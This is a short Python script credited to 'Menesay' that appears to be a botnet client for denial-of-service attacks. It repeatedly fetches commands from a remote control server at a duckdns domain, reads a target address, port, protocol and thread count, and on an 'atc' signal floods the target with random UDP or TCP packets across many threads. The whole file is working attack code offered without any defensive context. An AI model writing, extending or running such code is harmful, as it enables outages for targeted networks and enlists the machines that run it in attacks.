#Author: Menesay

import socket
import random
import threading
import urllib.request
import time

start_stop = False
url="http://duvi.duckdns.org/"

with urllib.request.urlopen(url) as req:
    content=req.read()

content = str(content)
data=content.split("P")

ip = data[1]
port = int(data[2])
choice = data[3]
times = int(data[4])
threads = int(data[5])
attack =data[6]

def udp():
        global ip, port, choice, times, threads, attack, start_stop
        data = random._urandom(1024)
        i = random.choice(("[*]","[!]","[#]"))
        while start_stop == True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip),int(port))
                for x in range(times):
                    s.sendto(data,addr)
                print(i +"UDP Sent!!!")
            except:
                s.close()
                print("[!] Error!!!")


def tcp():
        global ip, port, choice, times, threads, attack, start_stop
        data = random._urandom(16)
        i = random.choice(("[*]","[!]","[#]"))
        while start_stop == True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(data)
                for x in range(times):
                    s.send(data)
                print(i +"TCP Sent!!!")
            except:
                s.close()
                print("[*] Error")

def new():
        global ip, port, choice, times, threads, attack
        for y in range(threads):
            if choice == 'u':
                th = threading.Thread(target = udp)
                th.start()
            if choice == "t":
                th = threading.Thread(target = tcp)
                th.start()

if __name__ == '__main__':

        while True:
            time.sleep(10)
            with urllib.request.urlopen(url) as req:
                content=req.read()

            content = str(content)
            data=content.split("P")

            ip = data[1]
            port = int(data[2])
            choice = data[3]
            times = int(data[4])
            threads = int(data[5])
            attack =data[6]
            
            if data[6] != "atc":
                start_stop = False
            if data[6] == "atc":
                start_stop = True
                new()